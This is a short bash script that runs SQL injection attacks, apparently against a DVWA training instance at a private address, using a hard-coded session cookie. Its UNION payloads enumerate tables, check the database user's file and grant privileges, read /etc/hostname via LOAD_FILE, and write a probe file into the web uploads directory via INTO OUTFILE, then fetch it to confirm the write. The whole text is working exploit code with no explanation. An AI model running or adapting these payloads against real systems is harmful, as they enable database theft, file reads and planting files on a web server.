CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=low'
BASE='http://10.31.0.87:3000'
sq(){ curl -s -b "$CK" "$BASE/vulnerabilities/sqli/" -G --data-urlencode "id=$1" --data-urlencode "Submit=Submit" | grep -oE '<pre>.*</pre>' | sed 's/<[^>]*>//g' | head -c 2000; echo " <<== $1"; }
sq "' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- x"
sq "' UNION SELECT file_priv,grant_priv FROM mysq''l.user WHERE user='dvwa' -- x"
sq "' UNION SELECT LOAD_FILE('/etc/hostname'),2 -- x" | head -c 300
echo
sq "' UNION SELECT 'AEGIS_PROOF',2 INTO OUTFILE '/var/www/html/hackable/uploads/aegis_probe.txt' -- x"
curl -s -b "$CK" -o /tmp/probe_out -w '%{http_code} %{size_download}\n' "$BASE/hackable/uploads/aegis_probe.txt"
head -c 300 /tmp/probe_out 2>/dev/null
